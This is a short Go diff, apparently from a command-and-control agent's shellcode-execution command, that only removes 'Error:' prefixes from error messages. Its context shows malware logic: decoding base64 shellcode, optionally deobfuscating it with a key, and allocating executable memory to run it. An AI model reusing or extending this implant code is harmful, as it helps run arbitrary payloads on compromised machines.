@@ -24,29 +24,29 @@ func (c *ExecuteShellcodeCommand) Description() string {
 
 func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: shellcode_b64 parameter required")
+		return errorResult("shellcode_b64 parameter required")
 	}
 	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
 	if parseErr != nil {
 		return *parseErr
 	}
 	if args.ShellcodeB64 == "" {
-		return errorResult("Error: shellcode_b64 is empty")
+		return errorResult("shellcode_b64 is empty")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: shellcode is empty after decoding")
+		return errorResult("shellcode is empty after decoding")
 	}
 
 	if args.Encoding != "" && args.Encoding != "none" {
 		shellcode, err = decodeShellcode(shellcode, args.Encoding, args.Key)
 		if err != nil {
-			return errorf("Error decoding shellcode (%s): %v", args.Encoding, err)
+			return errorf("decoding shellcode (%s): %v", args.Encoding, err)
 		}
 	}
 
@@ -62,7 +62,7 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 		addr, method, err = allocShellcodeX86(shellcode, allocSize)
 	}
 	if err != nil {
-		return errorf("Error: failed to allocate executable memory for shellcode (%s): %v", runtime.GOARCH, err)
+		return errorf("failed to allocate executable memory for shellcode (%s): %v", runtime.GOARCH, err)
 	}
 
 	funcAddr := addr
